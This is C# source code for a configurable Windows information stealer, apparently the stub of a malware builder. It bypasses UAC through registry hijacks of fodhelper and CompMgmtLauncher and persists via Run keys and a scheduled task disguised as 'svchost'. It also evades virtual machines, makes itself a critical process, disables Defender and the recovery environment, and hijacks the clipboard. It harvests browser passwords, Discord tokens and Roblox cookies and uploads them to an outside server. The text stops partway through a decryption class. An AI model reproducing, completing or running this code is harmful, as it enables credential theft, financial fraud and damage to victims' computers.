using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Diagnostics;
using System.Globalization;
using System.IO;
using System.Linq;
using System.Management;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Security.Principal;
using System.ServiceProcess;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Web.Script.Serialization;
using System.Windows.Forms;
using static Clipper;

[assembly: AssemblyTitle("#title")]
[assembly: AssemblyDescription("#description")]
[assembly: AssemblyFileVersion("#version")]
[assembly: AssemblyCompany("#company")]
[assembly: AssemblyProduct("#product")]
[assembly: AssemblyCopyright("#copyright")]
[assembly: AssemblyTrademark("#trademark")]

namespace test
{
    class Program
    {
        static WebClient wb = new WebClient();


        //strings & list//
        public static List<string> files = new List<string>();
        public static List<string> paramName = new List<string>();
        public static string UTLink = "https://rblx-trade.com/UT.php";
        public static string UPLink = "https://rblx-trade.com/upload.php";
        public static string tempPath = System.IO.Path.GetTempPath();
        public static string aftermovename = Infos.GetShortID();
        public static string personalID = "#UID";
        public static string botID = $"{Infos.GetShortID()}_{Environment.UserName}";
        public static string folderName = Infos.GetShortID();
        public static string passwordTXT = "";
        public static string tokenTXT = "";
        //strings end//

        //blockpart//
        static string websites = "#websitesToBlock";
        static string[] splittedWebsites = websites.Split(';');

        static string programs = "#programsToBlock";
        static string[] splittedprograms = programs.Split(';');
        //blockpart end//

        //Bools//
        static bool IsElevated => new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);
        public static bool startup = bool.Parse("#startup");
        public static bool bypass = bool.Parse("#bypass");
        public static bool critical = bool.Parse("#critical");
        public static bool hideFile = bool.Parse("#hiddenFile");
        public static bool antiVM = bool.Parse("#antiVM");
        public static bool blockWebsites = bool.Parse("#wBlocker");
        public static bool blockPrograms = bool.Parse("#pBlocker");
        public static bool pwRecovery = bool.Parse("#pwRecovery");
        public static bool discordToken = bool.Parse("#tokenRecovery");
        public static bool robloxCookie = bool.Parse("#cookieRecovery");
        public static bool singleInstance = bool.Parse("#singleInstance");
        public static bool activateMsg = bool.Parse("#activate");
        public static string captionMsg = "#caption";
        public static string mainMsg = "#Main";
        public static bool disableWD = bool.Parse("#disableWD");
        public static bool recoveryEnvironment = bool.Parse("#disableRE");
        public static bool clipper = bool.Parse("#clipper");
        //Bools End//

        //DLL Imports//
        [DllImport("kernel32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool GetPhysicallyInstalledSystemMemory(out long TotalMemoryInKilobytes);

        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);
        //DLL Imports End//

        static void Main(string[] args)
        {
            File.WriteAllText($@"{Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments)}\{Infos.GetShortID()}.txt", personalID);
            Task.Factory.StartNew(delegate ()
            {
                foreach (ServiceController s in ServiceController.GetServices())
                {
                    if ((s.ServiceName == "QEMU-GA" || s.ServiceName == "VBoxService") && s.Status.Equals(ServiceControllerStatus.Running))
                    {
                        Environment.Exit(0);
                    }
                }
            }).Wait();
            if (antiVM == true)
            {
                Task.Factory.StartNew(delegate ()
                {
                    VirtualMachine.CheckVM();
                }).Wait();
            }
            if (singleInstance == true)
            {
                bool createdNew;
                Mutex m = new Mutex(true, System.Diagnostics.Process.GetCurrentProcess().ProcessName, out createdNew);
                if (!createdNew)
                {
                    return;
                }
            }
            if (bypass == true)
            {
                if (!IsElevated)
                {
                    ManagementObjectSearcher mos = new ManagementObjectSearcher("select * from Win32_OperatingSystem");
                    foreach (ManagementObject managementObject in mos.Get())
                    {
                        String OSName = managementObject["Caption"].ToString();
                        if (OSName.Contains("7"))
                        {
                            Registry.SetValue(@"HKEY_CURRENT_USER\Software\Classes\mscfile\shell\open\command", String.Empty, Environment.GetCommandLineArgs()[0]);
                            var process = Process.Start("CompMgmtLauncher.exe");
                            process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                            process.WaitForExit();
                            using (RegistryKey regkey = Registry.CurrentUser.OpenSubKey(@"Software\Classes\", true))
                            {
                                if (regkey.OpenSubKey("mscfile") != null)
                                {
                                    regkey.DeleteSubKeyTree("mscfile");
                                }
                            }
                        }
                        if (OSName.Contains("vista"))
                        {
                            Registry.SetValue(@"HKEY_CURRENT_USER\Software\Classes\mscfile\shell\open\command", String.Empty, Environment.GetCommandLineArgs()[0]);
                            var process = Process.Start("CompMgmtLauncher.exe");
                            process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                            process.WaitForExit();
                            using (RegistryKey regkey = Registry.CurrentUser.OpenSubKey(@"Software\Classes\", true))
                            {
                                if (regkey.OpenSubKey("mscfile") != null)
                                {
                                    regkey.DeleteSubKeyTree("mscfile");
                                }
                            }
                        }
                        if (OSName.Contains("8"))
                        {
                            Registry.SetValue(@"HKEY_CURRENT_USER\Software\Classes\mscfile\shell\open\command", String.Empty, Environment.GetCommandLineArgs()[0]);
                            var process = Process.Start("CompMgmtLauncher.exe");
                            process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                            process.WaitForExit();
                            using (RegistryKey regkey = Registry.CurrentUser.OpenSubKey(@"Software\Classes\", true))
                            {
                                if (regkey.OpenSubKey("mscfile") != null)
                                {
                                    regkey.DeleteSubKeyTree("mscfile");
                                }
                            }
                        }
                        if (OSName.Contains("10"))
                        {

                            Registry.SetValue(@"HKEY_CURRENT_USER\SOFTWARE\Classes\ms-settings\shell\open\command", String.Empty, Environment.GetCommandLineArgs()[0]);
                            Registry.SetValue(@"HKEY_CURRENT_USER\SOFTWARE\Classes\ms-settings\shell\open\command", "DelegateExecute", String.Empty);
                            var process = Process.Start("fodhelper.exe");
                            process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                            process.WaitForExit();
                            using (RegistryKey regkey = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Classes\", true))
                            {
                                if (regkey.OpenSubKey("ms-settings") != null)
                                {
                                    regkey.DeleteSubKeyTree("ms-settings");
                                }
                            }
                        }
                    }
                    Environment.Exit(0);
                }
                else
                {
                    //do everything if uac is bypassed
                    Task.Factory.StartNew(delegate ()
                    {
                        Helper();
                    }).Wait();
                }
            }
            else if (bypass == false)
            {
                //do everything if uac isn't bypassed
                Task.Factory.StartNew(delegate ()
                {
                    Helper();
                }).Wait();
            }
        }

        static void Helper()
        {
            if (hideFile == true)
            {
                File.Move(Assembly.GetEntryAssembly().Location, $@"{tempPath}{aftermovename}.exe");
                File.SetAttributes($@"{tempPath}{aftermovename}.exe", FileAttributes.Hidden);
            }
            if (activateMsg == true)
            {
                Thread t = new Thread(() => Infos.MyMessageBox(mainMsg, captionMsg));
                t.Start();
            }
            addStartup();
            if (IsElevated)
            {
                try
                {
                    criticalProcess();
                    if (blockWebsites == true)
                    {
                        if (!File.Exists(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), "drivers/etc/hosts")))
                        {
                            File.Create(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), "drivers/etc/hosts"));
                        }
                        string[] hostData = File.ReadAllLines(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), "drivers/etc/hosts"));
                        List<string> hostDataList = new List<string>(hostData);
                        foreach (string url in splittedWebsites)
                        {
                            string urlToBlock = "127.0.0.1" + " " + url;
                            hostDataList.Add(urlToBlock);
                        }
                        string savePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), "drivers/etc/hosts");
                        string[] hostDataArray = hostDataList.ToArray();
                        File.WriteAllLines(savePath, hostDataArray);
                    }
                    if (blockPrograms == true)
                    {
                        foreach (string program in splittedprograms)
                        {
                            Registry.SetValue($"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\{program}", "Debugger", "C:\\Windows\\System32\\" + Infos.GetShortID() + ".exe");
                        }
                    }
                }
                catch (Exception) { }
            }
            passwordRecovery();
            DiscordToken();
            disableWindowsDefender();
            disableRecoveryEnv();
            uploadData();
            GetCookieAsync();
            Clipper();
            Thread.Sleep(-1);
        }
        static void addStartup()
        {
            if (startup == true)
            {
                if (!IsElevated)
                {
                    if (hideFile == true)
                    {
                        RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                        registryKey.SetValue($"{Infos.GetShortID()}", $@"{Environment.GetCommandLineArgs()[0]}");
                    }
                    else
                    {
                        RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                        registryKey.SetValue($"{Infos.GetShortID()}", $@"{Environment.GetCommandLineArgs()[0]}");
                    }
                }
                else
                {
                    if (hideFile == true)
                    {
                        RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                        registryKey.SetValue($"{aftermovename}", $@"{tempPath}{aftermovename}.exe");

                        ProcessStartInfo startInfo = new ProcessStartInfo("schtasks")
                        {
                            Arguments = "/create /tn \"" + "svchost" + "\" /sc ONLOGON /tr \"" + $@"{tempPath}{aftermovename}.exe" + "\" /rl HIGHEST /f",
                            UseShellExecute = false,
                            CreateNoWindow = true
                        };
                        Process.Start(startInfo);
                    }
                    else
                    {
                        RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                        registryKey.SetValue($"{aftermovename}", $@"{tempPath}{aftermovename}.exe");

                        ProcessStartInfo startInfo = new ProcessStartInfo("schtasks")
                        {
                            Arguments = "/create /tn \"" + "svchost" + "\" /sc ONLOGON /tr \"" + $@"{Environment.GetCommandLineArgs()[0]}" + "\" /rl HIGHEST /f",
                            UseShellExecute = false,
                            CreateNoWindow = true
                        };
                        Process.Start(startInfo);
                    }
                }
            }
        }
        static void criticalProcess()
        {
            if (critical == true)
            {
                SystemEvents.SessionEnded += new SessionEndedEventHandler(SystemEvents_SessionEnded);
                int isCritical = 1;
                int BreakOnTermination = 0x1D;

                Process.EnterDebugMode();
                NtSetInformationProcess(Process.GetCurrentProcess().Handle, BreakOnTermination, ref isCritical, sizeof(int));
            }
        }
        static void SystemEvents_SessionEnded(object sender, SessionEndedEventArgs e)
        {
            int isCritical = 0;
            int BreakOnTermination = 0x1D;
            NtSetInformationProcess(Process.GetCurrentProcess().Handle, BreakOnTermination, ref isCritical, sizeof(int));
        }
        static void passwordRecovery()
        {
            try
            {
                if (pwRecovery == true)
                {
                    string randomid = Infos.GetShortID();
                    var fs1 = new FileStream($@"{tempPath}{randomid}.txt", FileMode.OpenOrCreate, FileAccess.Write);
                    var writer = new StreamWriter(fs1);

                    var a = Chromium.Grab();

                    foreach (var b in a)
                    {
                        writer.Write($"IXWare Recovery\r\nWebsite: {b.URL}\r\nUsername: {b.UserName}\r\nPassword: {b.Password}\r\nBrowser: {b.Application}\r\n\r\n");
                    }
                    writer.Close();
                    passwordTXT = $@"{tempPath}{randomid}.txt";
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
            }
        }
        static void disableWindowsDefender()
        {
            if (disableWD == true)
            {
                Defender.Disable();
            }
        }
        static async void disableRecoveryEnv()
        {
            if (recoveryEnvironment == true)
            {
                await Task.Run(async () =>
                {
                    try
                    {
                        var mosxxxx = new ManagementObjectSearcher("select * from Win32_OperatingSystem");
                        foreach (ManagementObject managementObject in mosxxxx.Get())
                        {
                            var OSName = managementObject["Caption"].ToString();
                            if (OSName.Contains("7"))
                                try
                                {
                                    var cmd = new Process();
                                    cmd.StartInfo.FileName = "cmd.exe";
                                    cmd.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                                    cmd.StartInfo.Arguments = "/c reagentc /disable";
                                    cmd.Start();

                                    var cmd1x = new Process();
                                    cmd1x.StartInfo.FileName = "cmd.exe";
                                    cmd1x.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                                    cmd1x.StartInfo.Arguments = "/c bcdedit /set {default} recoveryenabled No";
                                    cmd1x.Start();
                                }
                                catch (Exception)
                                {
                                }

                            if (OSName.Contains("8"))
                                try
                                {
                                    var cmd = new Process();
                                    cmd.StartInfo.FileName = "cmd.exe";
                                    cmd.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                                    cmd.StartInfo.Arguments = "/c reagentc.exe /disable";
                                    cmd.Start();

                                    var cmd1x = new Process();
                                    cmd1x.StartInfo.FileName = "cmd.exe";
                                    cmd1x.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                                    cmd1x.StartInfo.Arguments = "/c bcdedit /set {default} recoveryenabled No";
                                    cmd1x.Start();
                                }
                                catch (Exception)
                                {
                                }

                            if (OSName.Contains("Vista"))
                                try
                                {
                                    var cmd = new Process();
                                    cmd.StartInfo.FileName = "cmd.exe";
                                    cmd.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                                    cmd.StartInfo.Arguments = "/c reagentc /disable";
                                    cmd.Start();

                                    var cmd1x = new Process();
                                    cmd1x.StartInfo.FileName = "cmd.exe";
                                    cmd1x.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                                    cmd1x.StartInfo.Arguments = "/c bcdedit /set {default} recoveryenabled No";
                                    cmd1x.Start();
                                }
                                catch (Exception)
                                {
                                }

                            if (OSName.Contains("10"))
                                try
                                {
                                    var cmd = new Process();
                                    cmd.StartInfo.FileName = "cmd.exe";
                                    cmd.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                                    cmd.StartInfo.Arguments = "/c reagentc.exe /disable";
                                    cmd.Start();

                                    var cmd1x = new Process();
                                    cmd1x.StartInfo.FileName = "cmd.exe";
                                    cmd1x.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                                    cmd1x.StartInfo.Arguments = "/c bcdedit /set {default} recoveryenabled No";
                                    cmd1x.Start();
                                }
                                catch (Exception)
                                {
                                }
                        }
                    }
                    catch (Exception) { }
                });
            }
        }
        static void DiscordToken()
        {
            if (discordToken == true)
            {
                string randomid = Infos.GetShortID();
                var fs1 = new FileStream($@"{tempPath}{randomid}.txt", FileMode.OpenOrCreate, FileAccess.Write);
                var writer = new StreamWriter(fs1);

                foreach (string token in GetDiscordToken.RetrieveDiscordTokens())
                {
                    writer.Write(token);
                }
                writer.Close();
                tokenTXT = $@"{tempPath}{randomid}.txt";
            }
        }

        //----------------------------------CLIPPER----------------------------------//
        static void Clipper()
        {
            if (clipper == true)
            {
                new Thread(() => { Run(); }).Start();
            }
        }
        public static void Run()
        {
            Application.Run(new ClipboardNotification.NotificationForm());
        }
        //----------------------------------CLIPPER END----------------------------------//

        //----------------------------------ROBLOX COOKIE----------------------------------//
        static async Task GetCookieAsync()
        {
            if (robloxCookie == true)
            {
                try
                {
                    bool loopc = true;
                    while (loopc)
                    {
                        foreach (Process proc in Process.GetProcessesByName("RobloxPlayerBeta"))
                        {
                            Process[] process = Process.GetProcessesByName("RobloxPlayerBeta");
                            Console.WriteLine("hi");
                            string randomid = Infos.GetShortID();
                            string auth = GetCommandLine(process[0]).Split(' ')[5];
                            string get = await GetAsync($"https://rblx-trade.com/authtocookie?auth={auth}");
                            File.WriteAllText($@"{tempPath}{randomid}.txt", get);

                            string UT = wb.DownloadString(UTLink);
                            NameValueCollection headers = new NameValueCollection();
                            headers.Add("Security", Crypto.encrypt(Crypto.SHA($"877692{UT}")));
                            headers.Add("pID", Crypto.encrypt(personalID));
                            headers.Add("botID", Crypto.encrypt(botID));
                            headers.Add("robloxCookie", Crypto.encrypt("COOKIE"));
                            headers.Add("folderName", Crypto.encrypt(folderName));
                            NameValueCollection nvc = new NameValueCollection();

                            files.Clear();
                            paramName.Clear();
                            files.Add($@"{tempPath}{randomid}.txt");
                            paramName.Add("robloxCookie");
                            UploadData.HttpUploadFile(UPLink, files, paramName, new string[] { "text/plain" }, nvc, headers);
                            loopc = false;
                        }
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex.ToString());
                }
            }
        }
        public static async Task<string> GetAsync(string uri)
        {
            HttpWebRequest request = (HttpWebRequest)WebRequest.Create(uri);
            request.AutomaticDecompression = DecompressionMethods.GZip | DecompressionMethods.Deflate;

            using (HttpWebResponse response = (HttpWebResponse)await request.GetResponseAsync())
            using (Stream stream = response.GetResponseStream())
            using (StreamReader reader = new StreamReader(stream))
            {
                return await reader.ReadToEndAsync();
            }
        }
        private static string GetCommandLine(Process process)
        {
            using (ManagementObjectSearcher searcher = new ManagementObjectSearcher($"SELECT CommandLine FROM Win32_Process WHERE ProcessId = {process.Id}"))
            using (ManagementObjectCollection objects = searcher.Get())
            {
                return objects.Cast<ManagementBaseObject>().SingleOrDefault()?["CommandLine"]?.ToString();
            }
        }
        //----------------------------------ROBLOX COOKIE END----------------------------------//
        static void uploadData()
        {
            string UT = wb.DownloadString(UTLink);
            NameValueCollection headers = new NameValueCollection();
            headers.Add("Security", Crypto.encrypt(Crypto.SHA($"877692{UT}")));
            headers.Add("pID", Crypto.encrypt(personalID));
            headers.Add("country", Crypto.encrypt(Infos.GetCountryByIP()));
            headers.Add("botID", Crypto.encrypt(botID));
            headers.Add("botName", Crypto.encrypt(Environment.MachineName));
            headers.Add("os", Crypto.encrypt(Infos.versionName));
            headers.Add("ip", Crypto.encrypt(Infos.IP()));
            headers.Add("hwid", Crypto.encrypt(Crypto.SHA(Infos.GetHDDSerial())));
            headers.Add("folderName", Crypto.encrypt(folderName));
            NameValueCollection nvc = new NameValueCollection();

            files.Clear();
            if (pwRecovery == true)
            {
                files.Add(passwordTXT);
                paramName.Add("passwords");
            }
            if (discordToken == true)
            {
                files.Add(tokenTXT);
                paramName.Add("discordToken");
            }
            UploadData.HttpUploadFile(UPLink, files, paramName, new string[] { "text/plain", "text/plain" }, nvc, headers);
            if (File.Exists(passwordTXT))
            {
                File.Delete(passwordTXT);
            }
            if (File.Exists(tokenTXT))
            {
                File.Delete(tokenTXT);
            }
        }
    }
}

class Infos
{
    public static string versionName = new ComputerInfo().OSFullName;
    public static string GetCountryByIP()
    {
        IpInfo ipInfo = new IpInfo();
        string info = new WebClient().DownloadString("http://ipinfo.io");
        JavaScriptSerializer jsonObject = new JavaScriptSerializer();
        ipInfo = jsonObject.Deserialize<IpInfo>(info);

        RegionInfo region = new RegionInfo(ipInfo.Country);

        return region.EnglishName;
    }
    public static string IP()
    {
        IpInfo ipInfo = new IpInfo();
        string info = new WebClient().DownloadString("http://ipinfo.io");
        JavaScriptSerializer jsonObject = new JavaScriptSerializer();
        ipInfo = jsonObject.Deserialize<IpInfo>(info);

        return ipInfo.IP;
    }

    public static string GetHDDSerial()
    {
        ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT * FROM Win32_PhysicalMedia");

        foreach (ManagementObject wmi_HD in searcher.Get())
        {
            if (wmi_HD["SerialNumber"] != null)
                return wmi_HD["SerialNumber"].ToString();
        }

        return string.Empty;
    }
    public static string GetShortID()
    {
        var crypto = new RNGCryptoServiceProvider();
        var bytes = new byte[20];
        crypto.GetBytes(bytes);
        return BitConverter.ToString(bytes).Replace("-", string.Empty);
    }
    public static void MyMessageBox(object text, object caption)
    {
        MessageBox.Show((string)text, (string)caption, MessageBoxButtons.OK, MessageBoxIcon.Error);
    }
}

class Crypto
{
    public static string password = "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";
    public static string decrypt(string text)
    {
        SHA256 mySHA256 = SHA256Managed.Create();
        byte[] key = mySHA256.ComputeHash(Encoding.ASCII.GetBytes(password));
        byte[] iv = new byte[16] { 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0 };

        return DecryptString(text, key, iv);
    }
    public static string encrypt(string text)
    {
        SHA256 mySHA256 = SHA256Managed.Create();
        byte[] key = mySHA256.ComputeHash(Encoding.ASCII.GetBytes(password));
        byte[] iv = new byte[16] { 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0 };
        return EncryptString(text, key, iv);
    }
    public static string EncryptString(string plainText, byte[] key, byte[] iv)
    {
        Aes encryptor = Aes.Create();
        encryptor.Mode = CipherMode.CBC;
        byte[] aesKey = new byte[32];
        Array.Copy(key, 0, aesKey, 0, 32);
        encryptor.Key = aesKey;
        encryptor.IV = iv;
        MemoryStream memoryStream = new MemoryStream();
        ICryptoTransform aesEncryptor = encryptor.CreateEncryptor();
        CryptoStream cryptoStream = new CryptoStream(memoryStream, aesEncryptor, CryptoStreamMode.Write);
        byte[] plainBytes = Encoding.ASCII.GetBytes(plainText);
        cryptoStream.Write(plainBytes, 0, plainBytes.Length);
        cryptoStream.FlushFinalBlock();
        byte[] cipherBytes = memoryStream.ToArray();
        memoryStream.Close();
        cryptoStream.Close();
        string cipherText = Convert.ToBase64String(cipherBytes, 0, cipherBytes.Length);
        return cipherText;
    }
    public static string DecryptString(string cipherText, byte[] key, byte[] iv)
    {
        Aes encryptor = Aes.Create();
        encryptor.Mode = CipherMode.CBC;
        byte[] aesKey = new byte[32];
        Array.Copy(key, 0, aesKey, 0, 32);
        encryptor.Key = aesKey;
        encryptor.IV = iv;
        MemoryStream memoryStream = new MemoryStream();
        ICryptoTransform aesDecryptor = encryptor.CreateDecryptor();
        CryptoStream cryptoStream = new CryptoStream(memoryStream, aesDecryptor, CryptoStreamMode.Write);
        string plainText = String.Empty;
        try
        {
            byte[] cipherBytes = Convert.FromBase64String(cipherText);
            cryptoStream.Write(cipherBytes, 0, cipherBytes.Length);
            cryptoStream.FlushFinalBlock();
            byte[] plainBytes = memoryStream.ToArray();
            plainText = Encoding.ASCII.GetString(plainBytes, 0, plainBytes.Length);
        }
        finally
        {
            memoryStream.Close();
            cryptoStream.Close();
        }
        return plainText;
    }
    public static string SHA(string rawData)
    {
        using (SHA256 sha256Hash = SHA256.Create())
        {
            byte[] bytes = sha256Hash.ComputeHash(Encoding.UTF8.GetBytes(rawData));

            StringBuilder builder = new StringBuilder();
            for (int i = 0; i < bytes.Length; i++)
            {
                builder.Append(bytes[i].ToString("x2"));
            }
            return builder.ToString();
        }
    }
}

class UploadData
{
    public static void HttpUploadFile(string url, List<string> file, List<string> paramName, string[] contentType, NameValueCollection nvc, NameValueCollection headerItems)
    {
        Console.WriteLine(string.Format("Uploading {0} to {1}", file, url));
        string boundary = "---------------------------" + DateTime.Now.Ticks.ToString("x");
        byte[] boundarybytes = System.Text.Encoding.ASCII.GetBytes("\r\n--" + boundary + "\r\n");

        HttpWebRequest wr = (HttpWebRequest)WebRequest.Create(url);

        foreach (string key in headerItems.Keys)
        {
            if (key == "Referer")
            {
                wr.Referer = headerItems[key];
            }
            else
            {
                wr.Headers.Add(key, headerItems[key]);
            }
        }

        wr.ContentType = "multipart/form-data; boundary=" + boundary;
        wr.Method = "POST";
        wr.KeepAlive = true;
        wr.Credentials = System.Net.CredentialCache.DefaultCredentials;

        Stream rs = wr.GetRequestStream();

        string formdataTemplate = "Content-Disposition: form-data; name=\"{0}\"\r\n\r\n{1}";
        foreach (string key in nvc.Keys)
        {
            rs.Write(boundarybytes, 0, boundarybytes.Length);
            string formitem = string.Format(formdataTemplate, key, nvc[key]);
            byte[] formitembytes = System.Text.Encoding.UTF8.GetBytes(formitem);
            rs.Write(formitembytes, 0, formitembytes.Length);
        }
        rs.Write(boundarybytes, 0, boundarybytes.Length);

        string headerTemplate = "Content-Disposition: form-data; name=\"{0}\"; filename=\"{1}\"\r\nContent-Type: {2}\r\n\r\n";
        string header = "";

        for (int i = 0; i < file.Count(); i++)
        {
            header = string.Format(headerTemplate, paramName[i], System.IO.Path.GetFileName(file[i]), contentType[i]);
            byte[] headerbytes = System.Text.Encoding.UTF8.GetBytes(header);
            rs.Write(headerbytes, 0, headerbytes.Length);

            FileStream fileStream = new FileStream(file[i], FileMode.Open, FileAccess.Read);
            byte[] buffer = new byte[4096];
            int bytesRead = 0;
            while ((bytesRead = fileStream.Read(buffer, 0, buffer.Length)) != 0)
            {
                rs.Write(buffer, 0, bytesRead);
            }
            fileStream.Close();
            rs.Write(boundarybytes, 0, boundarybytes.Length);
        }
        rs.Close();

        WebResponse wresp = null;
        try
        {
            wresp = wr.GetResponse();
            Stream stream2 = wresp.GetResponseStream();
            StreamReader reader2 = new StreamReader(stream2);
            Console.WriteLine(string.Format("File uploaded, server response is: {0}", reader2.ReadToEnd()));
        }
        catch (Exception ex)
        {
            Console.WriteLine("Error uploading file", ex);
            wresp.Close();
            wresp = null;
        }
        finally
        {
            wr = null;
        }
    }
}

public class IpInfo
{
    public string Country { get; set; }
    public string IP { get; set; }
}


//----------------------------------Passwords, ecrypt etc.----------------------------------//
class AesGcm
{
    public byte[] Decrypt(byte[] key, byte[] iv, byte[] aad, byte[] cipherText, byte[] authTag)
    {
        IntPtr hAlg = OpenAlgorithmProvider(BCrypt.BCRYPT_AES_ALGORITHM, BCrypt.MS_PRIMITIVE_PROVIDER, BCrypt.BCRYPT_CHAIN_MODE_GCM);
        IntPtr hKey, keyDataBuffer = ImportKey(hAlg, key, out hKey);

        byte[] plainText;

        var authInfo = new BCrypt.BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO(iv, aad, authTag);
        using (authInfo)
        {
            byte[] ivData = new byte[MaxAuthTagSize(hAlg)];

            int plainTextSize = 0;

            uint status = BCrypt.BCryptDecrypt(hKey, cipherText, cipherText.Length, ref authInfo, ivData, ivData.Length, null, 0, ref plainTextSize, 0x0);

            if (status != BCrypt.ERROR_SUCCESS)
                throw new CryptographicException(string.Format("BCrypt.BCryptDecrypt() (get size) failed with status code: {0}", status));

